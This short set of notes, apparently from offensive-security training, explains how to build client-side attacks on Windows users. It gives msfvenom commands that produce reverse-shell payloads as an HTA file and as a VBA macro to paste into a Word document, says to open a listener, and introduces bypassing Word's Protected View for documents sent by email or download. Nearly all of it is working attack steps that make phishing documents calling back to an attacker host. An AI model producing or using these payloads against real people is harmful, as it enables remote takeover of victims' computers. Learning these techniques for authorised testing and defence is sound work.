### http application attack(works against Internet Explorer and to some extent Microsoft Edge)
```
1. msfvenom -p windows/shell_reverse_tcp(windows/x64/shell_reverse_tcp,windows/x64/meterpreter/reverse_tcp) LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
```

### office word macro development(vba script)
```
1. msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.4 LPORT=4444 -f vba -o evil
2. open word document and edit macro, copy paste then save as doc,docm,docx
3. open a listener
```

### Evading Protected View
>This Microsoft Word document is highly effective when served locally, but when served from the Internet, say through an email or a download link, we must bypass another layer of protection known as Protected View,1 which disables all editing and modifications in the document and blocks the execution of macros or embedded objects.
